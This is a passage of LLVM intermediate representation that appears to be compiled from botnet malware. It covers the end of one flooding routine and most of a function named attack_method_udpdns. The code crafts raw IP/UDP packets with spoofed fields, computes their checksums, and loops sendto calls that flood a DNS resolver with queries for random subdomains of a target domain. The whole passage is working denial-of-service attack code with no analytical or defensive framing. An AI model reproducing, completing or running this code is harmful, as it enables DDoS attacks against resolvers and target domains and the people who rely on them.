  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 0, i32 1
  store i16 %147, i16* %160, align 2
  %161 = sext i32 %157 to i64
  %162 = add nsw i64 %161, 32
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 0
  %164 = bitcast %struct.sockaddr_in* %163 to %struct.sockaddr*
  %165 = call i64 @sendto(i32 %23, i8* nonnull %124, i64 %162, i32 16384, %struct.sockaddr* %164, i32 16) #10
  %166 = load i32, i32* %5, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %5, align 4
  %168 = icmp slt i32 %167, %29
  br i1 %168, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %192
  %169 = phi i32 [ %213, %192 ], [ 0, %.lr.ph.split.preheader ]
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8*, i8** %9, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = bitcast i8* %172 to %struct.iphdr*
  %174 = getelementptr inbounds i8, i8* %172, i64 20
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 2
  %176 = load i8, i8* %175, align 4
  %177 = icmp ult i8 %176, 32
  br i1 %177, label %178, label %185

; <label>:178:                                    ; preds = %.lr.ph.split
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = call i32 @ntohl(i32 %180) #11
  %182 = call i32 @htonl(i32 %181) #11
  %183 = getelementptr inbounds i8, i8* %172, i64 16
  %184 = bitcast i8* %183 to i32*
  store i32 %182, i32* %184, align 4
  br label %185

; <label>:185:                                    ; preds = %.lr.ph.split, %178
  br i1 %76, label %186, label %188

; <label>:186:                                    ; preds = %185
  %187 = bitcast i8* %174 to i16*
  store i16 0, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %186, %185
  %189 = getelementptr inbounds i8, i8* %172, i64 22
  %190 = bitcast i8* %189 to i16*
  br i1 %78, label %191, label %._crit_edge

._crit_edge:                                      ; preds = %188
  %.pre = load i16, i16* %190, align 2
  br label %192

; <label>:191:                                    ; preds = %188
  store i16 0, i16* %190, align 2
  br label %192

; <label>:192:                                    ; preds = %._crit_edge, %191
  %193 = phi i16 [ %.pre, %._crit_edge ], [ 0, %191 ]
  %194 = getelementptr inbounds i8, i8* %172, i64 10
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  %196 = bitcast i8* %172 to i16*
  %197 = call zeroext i16 @checksum_generic(i16* %196, i32 20)
  store i16 %197, i16* %195, align 2
  %198 = getelementptr inbounds i8, i8* %172, i64 26
  %199 = bitcast i8* %198 to i16*
  store i16 0, i16* %199, align 2
  %200 = getelementptr inbounds i8, i8* %172, i64 24
  %201 = bitcast i8* %200 to i16*
  %202 = load i16, i16* %201, align 2
  %203 = load i32, i32* %6, align 4
  %204 = add i32 %203, 12
  %205 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %173, i8* nonnull %174, i16 zeroext %202, i32 %204)
  store i16 %205, i16* %199, align 2
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 1
  store i16 %193, i16* %206, align 2
  %207 = sext i32 %203 to i64
  %208 = add nsw i64 %207, 32
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0
  %210 = bitcast %struct.sockaddr_in* %209 to %struct.sockaddr*
  %211 = call i64 @sendto(i32 %23, i8* nonnull %172, i64 %208, i32 16384, %struct.sockaddr* %210, i32 16) #10
  %212 = load i32, i32* %5, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %5, align 4
  %214 = icmp slt i32 %213, %29
  br i1 %214, label %.lr.ph.split, label %.loopexit.loopexit88

; <label>:215:                                    ; preds = %4, %71
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 53)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 9, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 12)
  %24 = trunc i32 %23 to i8
  %25 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %26 = tail call fastcc i32 @get_dns_resolver()
  %27 = icmp eq i8* %25, null
  br i1 %27, label %280, label %28

; <label>:28:                                     ; preds = %4
  %29 = tail call i32 @util_strlen(i8* nonnull %25) #10
  %30 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %280, label %32

; <label>:32:                                     ; preds = %28
  store i32 1, i32* %5, align 4
  %33 = bitcast i32* %5 to i8*
  %34 = call i32 @setsockopt(i32 %30, i32 0, i32 3, i8* nonnull %33, i32 4) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %116, label %.preheader122

.preheader122:                                    ; preds = %32
  store i32 0, i32* %5, align 4
  %36 = zext i8 %0 to i32
  %37 = icmp eq i8 %0, 0
  %.pre = and i32 %23, 255
  br i1 %37, label %.preheader122..preheader_crit_edge, label %.lr.ph130

.preheader122..preheader_crit_edge:               ; preds = %.preheader122
  %.pre139 = sext i32 %29 to i64
  br label %.preheader

.lr.ph130:                                        ; preds = %.preheader122
  %38 = zext i32 %.pre to i64
  %39 = sext i32 %29 to i64
  %40 = add nuw nsw i64 %38, 47
  %41 = add nsw i64 %40, %39
  %42 = trunc i64 %41 to i16
  %43 = icmp eq i8 %16, 0
  %44 = add nuw nsw i64 %38, 27
  %45 = add nsw i64 %44, %39
  %46 = trunc i64 %45 to i16
  %47 = add nsw i32 %29, 1
  %48 = icmp sgt i32 %29, 0
  %wide.trip.count = zext i32 %29 to i64
  br i1 %43, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  %xtraiter148 = and i64 %wide.trip.count, 1
  %lcmp.mod149 = icmp eq i64 %xtraiter148, 0
  %49 = icmp eq i32 %29, 1
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %50 = icmp eq i32 %29, 1
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %._crit_edge.us
  %51 = phi i32 [ %103, %._crit_edge.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %52 = call noalias i8* @calloc(i64 600, i64 1) #10
  %53 = sext i32 %51 to i64
  %54 = getelementptr inbounds i8*, i8** %8, i64 %53
  store i8* %52, i8** %54, align 8
  %55 = getelementptr inbounds i8, i8* %52, i64 20
  %56 = getelementptr inbounds i8, i8* %52, i64 28
  %57 = getelementptr inbounds i8, i8* %52, i64 40
  store i8 69, i8* %52, align 4
  %58 = getelementptr inbounds i8, i8* %52, i64 1
  store i8 %10, i8* %58, align 1
  %59 = call zeroext i16 @htons(i16 zeroext %42) #11
  %60 = getelementptr inbounds i8, i8* %52, i64 2
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = call zeroext i16 @htons(i16 zeroext %12) #11
  %63 = getelementptr inbounds i8, i8* %52, i64 4
  %64 = bitcast i8* %63 to i16*
  store i16 %62, i16* %64, align 4
  %65 = getelementptr inbounds i8, i8* %52, i64 8
  store i8 %14, i8* %65, align 4
  %66 = getelementptr inbounds i8, i8* %52, i64 9
  store i8 17, i8* %66, align 1
  %67 = load i32, i32* @LOCAL_ADDR, align 4
  %68 = getelementptr inbounds i8, i8* %52, i64 12
  %69 = bitcast i8* %68 to i32*
  store i32 %67, i32* %69, align 4
  %70 = getelementptr inbounds i8, i8* %52, i64 16
  %71 = bitcast i8* %70 to i32*
  store i32 %26, i32* %71, align 4
  %72 = call zeroext i16 @htons(i16 zeroext %18) #11
  %73 = bitcast i8* %55 to i16*
  store i16 %72, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %20) #11
  %75 = getelementptr inbounds i8, i8* %52, i64 22
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 2
  %77 = call zeroext i16 @htons(i16 zeroext %46) #11
  %78 = getelementptr inbounds i8, i8* %52, i64 24
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %22) #11
  %81 = bitcast i8* %56 to i16*
  store i16 %80, i16* %81, align 2
  %82 = call zeroext i16 @htons(i16 zeroext 256) #11
  %83 = getelementptr inbounds i8, i8* %52, i64 30
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext 1) #11
  %86 = getelementptr inbounds i8, i8* %52, i64 32
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = getelementptr inbounds i8, i8* %52, i64 41
  store i8 %24, i8* %57, align 1
  %89 = getelementptr inbounds i8, i8* %88, i64 %38
  %90 = getelementptr inbounds i8, i8* %89, i64 1
  call void @util_memcpy(i8* %90, i8* nonnull %25, i32 %47) #10
  br i1 %48, label %.lr.ph128.us.preheader, label %._crit_edge.us

.lr.ph128.us.preheader:                           ; preds = %.lr.ph130.split.us
  br i1 %lcmp.mod, label %.lr.ph128.us.prol.loopexit.unr-lcssa, label %.lr.ph128.us.prol.preheader

.lr.ph128.us.prol.preheader:                      ; preds = %.lr.ph128.us.preheader
  br label %.lr.ph128.us.prol

.lr.ph128.us.prol:                                ; preds = %.lr.ph128.us.prol.preheader
  %91 = load i8, i8* %25, align 1
  %92 = icmp eq i8 %91, 46
  br i1 %92, label %94, label %93

; <label>:93:                                     ; preds = %.lr.ph128.us.prol
  br label %96

; <label>:94:                                     ; preds = %.lr.ph128.us.prol
  store i8 0, i8* %89, align 1
  %95 = getelementptr inbounds i8, i8* %89, i64 1
  br label %96

; <label>:96:                                     ; preds = %94, %93
  %.1119.us.prol = phi i8* [ %95, %94 ], [ %89, %93 ]
  %.1.us.prol = phi i8 [ 0, %94 ], [ 1, %93 ]
  br label %.lr.ph128.us.prol.loopexit.unr-lcssa

.lr.ph128.us.prol.loopexit.unr-lcssa:             ; preds = %.lr.ph128.us.preheader, %96
  %.1119.us.lcssa.unr.ph = phi i8* [ %.1119.us.prol, %96 ], [ undef, %.lr.ph128.us.preheader ]
  %.1.us.lcssa.unr.ph = phi i8 [ %.1.us.prol, %96 ], [ undef, %.lr.ph128.us.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %96 ], [ 0, %.lr.ph128.us.preheader ]
  %.0115126.us.unr.ph = phi i8 [ %.1.us.prol, %96 ], [ 0, %.lr.ph128.us.preheader ]
  %.0118124.us.unr.ph = phi i8* [ %.1119.us.prol, %96 ], [ %89, %.lr.ph128.us.preheader ]
  br label %.lr.ph128.us.prol.loopexit

.lr.ph128.us.prol.loopexit:                       ; preds = %.lr.ph128.us.prol.loopexit.unr-lcssa
  br i1 %50, label %._crit_edge.us.loopexit, label %.lr.ph128.us.preheader.new

.lr.ph128.us.preheader.new:                       ; preds = %.lr.ph128.us.prol.loopexit
  br label %.lr.ph128.us

._crit_edge.us.loopexit.unr-lcssa:                ; preds = %286
  br label %._crit_edge.us.loopexit

._crit_edge.us.loopexit:                          ; preds = %.lr.ph128.us.prol.loopexit, %._crit_edge.us.loopexit.unr-lcssa
  %.1119.us.lcssa = phi i8* [ %.1119.us.lcssa.unr.ph, %.lr.ph128.us.prol.loopexit ], [ %.1119.us.1, %._crit_edge.us.loopexit.unr-lcssa ]
  %.1.us.lcssa = phi i8 [ %.1.us.lcssa.unr.ph, %.lr.ph128.us.prol.loopexit ], [ %.1.us.1, %._crit_edge.us.loopexit.unr-lcssa ]
  br label %._crit_edge.us

._crit_edge.us:                                   ; preds = %._crit_edge.us.loopexit, %.lr.ph130.split.us
  %.0118.lcssa.us = phi i8* [ %89, %.lr.ph130.split.us ], [ %.1119.us.lcssa, %._crit_edge.us.loopexit ]
  %.0115.lcssa.us = phi i8 [ 0, %.lr.ph130.split.us ], [ %.1.us.lcssa, %._crit_edge.us.loopexit ]
  store i8 %.0115.lcssa.us, i8* %.0118.lcssa.us, align 1
  %97 = getelementptr inbounds i8, i8* %89, i64 %39
  %98 = getelementptr inbounds i8, i8* %97, i64 2
  %99 = bitcast i8* %98 to i16*
  store i16 %85, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %98, i64 2
  %101 = bitcast i8* %100 to i16*
  store i16 %85, i16* %101, align 2
  %102 = load i32, i32* %5, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %5, align 4
  %104 = icmp slt i32 %103, %36
  br i1 %104, label %.lr.ph130.split.us, label %.preheader.loopexit

.lr.ph128.us:                                     ; preds = %286, %.lr.ph128.us.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph128.us.preheader.new ], [ %indvars.iv.next.1, %286 ]
  %.0115126.us = phi i8 [ %.0115126.us.unr.ph, %.lr.ph128.us.preheader.new ], [ %.1.us.1, %286 ]
  %.0118124.us = phi i8* [ %.0118124.us.unr.ph, %.lr.ph128.us.preheader.new ], [ %.1119.us.1, %286 ]
  %105 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv
  %106 = load i8, i8* %105, align 1
  %107 = icmp eq i8 %106, 46
  br i1 %107, label %110, label %108

; <label>:108:                                    ; preds = %.lr.ph128.us
  %109 = add i8 %.0115126.us, 1
  br label %.lr.ph128.us.1147

; <label>:110:                                    ; preds = %.lr.ph128.us
  store i8 %.0115126.us, i8* %.0118124.us, align 1
  %111 = getelementptr inbounds i8, i8* %89, i64 %indvars.iv
  %112 = getelementptr inbounds i8, i8* %111, i64 1
  br label %.lr.ph128.us.1147

.lr.ph128.us.1147:                                ; preds = %110, %108
  %.1119.us = phi i8* [ %112, %110 ], [ %.0118124.us, %108 ]
  %.1.us = phi i8 [ 0, %110 ], [ %109, %108 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %113 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv.next
  %114 = load i8, i8* %113, align 1
  %115 = icmp eq i8 %114, 46
  br i1 %115, label %283, label %281

; <label>:116:                                    ; preds = %32
  %117 = call i32 @close(i32 %30) #10
  br label %280

.preheader.loopexit:                              ; preds = %._crit_edge.us
  br label %.preheader

.preheader.loopexit146:                           ; preds = %._crit_edge
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit146, %.preheader.loopexit, %.preheader122..preheader_crit_edge
  %.pre-phi140 = phi i64 [ %.pre139, %.preheader122..preheader_crit_edge ], [ %39, %.preheader.loopexit ], [ %39, %.preheader.loopexit146 ]
  %118 = and i32 %11, 65535
  %119 = icmp eq i32 %118, 65535
  %120 = and i32 %17, 65535
  %121 = icmp eq i32 %120, 65535
  %122 = and i32 %19, 65535
  %123 = icmp eq i32 %122, 65535
  %124 = and i32 %21, 65535
  %125 = icmp eq i32 %124, 65535
  %126 = add nuw nsw i32 %.pre, 27
  %127 = add i32 %126, %29
  %addconv132 = add nuw nsw i32 %.pre, 47
  %128 = zext i32 %addconv132 to i64
  %129 = add nsw i64 %128, %.pre-phi140
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %._crit_edge
  %130 = phi i32 [ %196, %._crit_edge ], [ 0, %.lr.ph130.split.preheader ]
  %131 = call noalias i8* @calloc(i64 600, i64 1) #10
  %132 = sext i32 %130 to i64
  %133 = getelementptr inbounds i8*, i8** %8, i64 %132
  store i8* %131, i8** %133, align 8
  %134 = getelementptr inbounds i8, i8* %131, i64 20
  %135 = getelementptr inbounds i8, i8* %131, i64 28
  %136 = getelementptr inbounds i8, i8* %131, i64 40
  store i8 69, i8* %131, align 4
  %137 = getelementptr inbounds i8, i8* %131, i64 1
  store i8 %10, i8* %137, align 1
  %138 = call zeroext i16 @htons(i16 zeroext %42) #11
  %139 = getelementptr inbounds i8, i8* %131, i64 2
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = call zeroext i16 @htons(i16 zeroext %12) #11
  %142 = getelementptr inbounds i8, i8* %131, i64 4
  %143 = bitcast i8* %142 to i16*
  store i16 %141, i16* %143, align 4
  %144 = getelementptr inbounds i8, i8* %131, i64 8
  store i8 %14, i8* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %146 = getelementptr inbounds i8, i8* %131, i64 6
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = getelementptr inbounds i8, i8* %131, i64 9
  store i8 17, i8* %148, align 1
  %149 = load i32, i32* @LOCAL_ADDR, align 4
  %150 = getelementptr inbounds i8, i8* %131, i64 12
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %131, i64 16
  %153 = bitcast i8* %152 to i32*
  store i32 %26, i32* %153, align 4
  %154 = call zeroext i16 @htons(i16 zeroext %18) #11
  %155 = bitcast i8* %134 to i16*
  store i16 %154, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %20) #11
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %46) #11
  %160 = getelementptr inbounds i8, i8* %131, i64 24
  %161 = bitcast i8* %160 to i16*
  store i16 %159, i16* %161, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %22) #11
  %163 = bitcast i8* %135 to i16*
  store i16 %162, i16* %163, align 2
  %164 = call zeroext i16 @htons(i16 zeroext 256) #11
  %165 = getelementptr inbounds i8, i8* %131, i64 30
  %166 = bitcast i8* %165 to i16*
  store i16 %164, i16* %166, align 2
  %167 = call zeroext i16 @htons(i16 zeroext 1) #11
  %168 = getelementptr inbounds i8, i8* %131, i64 32
  %169 = bitcast i8* %168 to i16*
  store i16 %167, i16* %169, align 2
  %170 = getelementptr inbounds i8, i8* %131, i64 41
  store i8 %24, i8* %136, align 1
  %171 = getelementptr inbounds i8, i8* %170, i64 %38
  %172 = getelementptr inbounds i8, i8* %171, i64 1
  call void @util_memcpy(i8* %172, i8* nonnull %25, i32 %47) #10
  br i1 %48, label %.lr.ph128.preheader, label %._crit_edge

.lr.ph128.preheader:                              ; preds = %.lr.ph130.split
  br i1 %lcmp.mod149, label %.lr.ph128.prol.loopexit.unr-lcssa, label %.lr.ph128.prol.preheader

.lr.ph128.prol.preheader:                         ; preds = %.lr.ph128.preheader
  br label %.lr.ph128.prol

.lr.ph128.prol:                                   ; preds = %.lr.ph128.prol.preheader
  %173 = load i8, i8* %25, align 1
  %174 = icmp eq i8 %173, 46
  br i1 %174, label %176, label %175

; <label>:175:                                    ; preds = %.lr.ph128.prol
  br label %178

; <label>:176:                                    ; preds = %.lr.ph128.prol
  store i8 0, i8* %171, align 1
  %177 = getelementptr inbounds i8, i8* %171, i64 1
  br label %178

; <label>:178:                                    ; preds = %176, %175
  %.1119.prol = phi i8* [ %177, %176 ], [ %171, %175 ]
  %.1.prol = phi i8 [ 0, %176 ], [ 1, %175 ]
  br label %.lr.ph128.prol.loopexit.unr-lcssa

.lr.ph128.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph128.preheader, %178
  %.1119.lcssa.unr.ph = phi i8* [ %.1119.prol, %178 ], [ undef, %.lr.ph128.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %178 ], [ undef, %.lr.ph128.preheader ]
  %indvars.iv135.unr.ph = phi i64 [ 1, %178 ], [ 0, %.lr.ph128.preheader ]
  %.0115126.unr.ph = phi i8 [ %.1.prol, %178 ], [ 0, %.lr.ph128.preheader ]
  %.0118124.unr.ph = phi i8* [ %.1119.prol, %178 ], [ %171, %.lr.ph128.preheader ]
  br label %.lr.ph128.prol.loopexit

.lr.ph128.prol.loopexit:                          ; preds = %.lr.ph128.prol.loopexit.unr-lcssa
  br i1 %49, label %._crit_edge.loopexit, label %.lr.ph128.preheader.new

.lr.ph128.preheader.new:                          ; preds = %.lr.ph128.prol.loopexit
  br label %.lr.ph128

.lr.ph128:                                        ; preds = %292, %.lr.ph128.preheader.new
  %indvars.iv135 = phi i64 [ %indvars.iv135.unr.ph, %.lr.ph128.preheader.new ], [ %indvars.iv.next136.1, %292 ]
  %.0115126 = phi i8 [ %.0115126.unr.ph, %.lr.ph128.preheader.new ], [ %.1.1, %292 ]
  %.0118124 = phi i8* [ %.0118124.unr.ph, %.lr.ph128.preheader.new ], [ %.1119.1, %292 ]
  %179 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv135
  %180 = load i8, i8* %179, align 1
  %181 = icmp eq i8 %180, 46
  br i1 %181, label %182, label %185

; <label>:182:                                    ; preds = %.lr.ph128
  store i8 %.0115126, i8* %.0118124, align 1
  %183 = getelementptr inbounds i8, i8* %171, i64 %indvars.iv135
  %184 = getelementptr inbounds i8, i8* %183, i64 1
  br label %.lr.ph128.1150

; <label>:185:                                    ; preds = %.lr.ph128
  %186 = add i8 %.0115126, 1
  br label %.lr.ph128.1150

.lr.ph128.1150:                                   ; preds = %182, %185
  %.1119 = phi i8* [ %184, %182 ], [ %.0118124, %185 ]
  %.1 = phi i8 [ 0, %182 ], [ %186, %185 ]
  %indvars.iv.next136 = add nuw nsw i64 %indvars.iv135, 1
  %187 = getelementptr inbounds i8, i8* %25, i64 %indvars.iv.next136
  %188 = load i8, i8* %187, align 1
  %189 = icmp eq i8 %188, 46
  br i1 %189, label %289, label %287

._crit_edge.loopexit.unr-lcssa:                   ; preds = %292
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph128.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1119.lcssa = phi i8* [ %.1119.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1119.1, %._crit_edge.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph128.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.lr.ph130.split
  %.0118.lcssa = phi i8* [ %171, %.lr.ph130.split ], [ %.1119.lcssa, %._crit_edge.loopexit ]
  %.0115.lcssa = phi i8 [ 0, %.lr.ph130.split ], [ %.1.lcssa, %._crit_edge.loopexit ]
  store i8 %.0115.lcssa, i8* %.0118.lcssa, align 1
  %190 = getelementptr inbounds i8, i8* %171, i64 %39
  %191 = getelementptr inbounds i8, i8* %190, i64 2
  %192 = bitcast i8* %191 to i16*
  store i16 %167, i16* %192, align 2
  %193 = getelementptr inbounds i8, i8* %191, i64 2
  %194 = bitcast i8* %193 to i16*
  store i16 %167, i16* %194, align 2
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %5, align 4
  %197 = icmp slt i32 %196, %36
  br i1 %197, label %.lr.ph130.split, label %.preheader.loopexit146

.loopexit.loopexit:                               ; preds = %216
  br label %.loopexit.backedge

.loopexit.loopexit145:                            ; preds = %256
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %37, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit145
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %119, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %216
  %storemerge120123.us = phi i32 [ %238, %216 ], [ 0, %.lr.ph.split.us.preheader ]
  %198 = sext i32 %storemerge120123.us to i64
  %199 = getelementptr inbounds i8*, i8** %8, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 28
  %204 = getelementptr inbounds i8, i8* %200, i64 41
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br i1 %121, label %207, label %209

; <label>:207:                                    ; preds = %.lr.ph.split.us
  %208 = bitcast i8* %202 to i16*
  store i16 0, i16* %208, align 2
  br label %209

; <label>:209:                                    ; preds = %207, %.lr.ph.split.us
  br i1 %123, label %210, label %213

; <label>:210:                                    ; preds = %209
  %211 = getelementptr inbounds i8, i8* %200, i64 22
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %210, %209
  br i1 %125, label %214, label %216

; <label>:214:                                    ; preds = %213
  %215 = bitcast i8* %203 to i16*
  store i16 0, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %214, %213
  call void @rand_alpha_str(i8* %204, i32 %.pre)
  %217 = getelementptr inbounds i8, i8* %200, i64 10
  %218 = bitcast i8* %217 to i16*
  store i16 0, i16* %218, align 2
  %219 = bitcast i8* %200 to i16*
  %220 = call zeroext i16 @checksum_generic(i16* %219, i32 20)
  store i16 %220, i16* %218, align 2
  %221 = getelementptr inbounds i8, i8* %200, i64 26
  %222 = bitcast i8* %221 to i16*
  store i16 0, i16* %222, align 2
  %223 = getelementptr inbounds i8, i8* %200, i64 24
  %224 = bitcast i8* %223 to i16*
  %225 = load i16, i16* %224, align 2
  %226 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %225, i32 %127)
  store i16 %226, i16* %222, align 2
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 2, i32 0
  store i32 %26, i32* %229, align 4
  %230 = getelementptr inbounds i8, i8* %200, i64 22
  %231 = bitcast i8* %230 to i16*
  %232 = load i16, i16* %231, align 2
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %232, i16* %233, align 2
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %235 = bitcast %struct.sockaddr_in* %234 to %struct.sockaddr*
  %236 = call i64 @sendto(i32 %30, i8* %200, i64 %129, i32 16384, %struct.sockaddr* %235, i32 16) #10
  %237 = load i32, i32* %5, align 4
  %238 = add nsw i32 %237, 1
  store i32 %238, i32* %5, align 4
  %239 = icmp slt i32 %238, %36
  br i1 %239, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %256
  %storemerge120123 = phi i32 [ %278, %256 ], [ 0, %.lr.ph.split.preheader ]
  %240 = sext i32 %storemerge120123 to i64
  %241 = getelementptr inbounds i8*, i8** %8, i64 %240
  %242 = load i8*, i8** %241, align 8
  %243 = bitcast i8* %242 to %struct.iphdr*
  %244 = getelementptr inbounds i8, i8* %242, i64 20
  %245 = getelementptr inbounds i8, i8* %242, i64 28
  %246 = getelementptr inbounds i8, i8* %242, i64 41
  br i1 %121, label %247, label %249

; <label>:247:                                    ; preds = %.lr.ph.split
  %248 = bitcast i8* %244 to i16*
  store i16 0, i16* %248, align 2
  br label %249

; <label>:249:                                    ; preds = %247, %.lr.ph.split
  br i1 %123, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %242, i64 22
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 2
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %125, label %254, label %256

; <label>:254:                                    ; preds = %253
  %255 = bitcast i8* %245 to i16*
  store i16 0, i16* %255, align 2
  br label %256

; <label>:256:                                    ; preds = %254, %253
  call void @rand_alpha_str(i8* %246, i32 %.pre)
  %257 = getelementptr inbounds i8, i8* %242, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %242 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20)
  store i16 %260, i16* %258, align 2
  %261 = getelementptr inbounds i8, i8* %242, i64 26
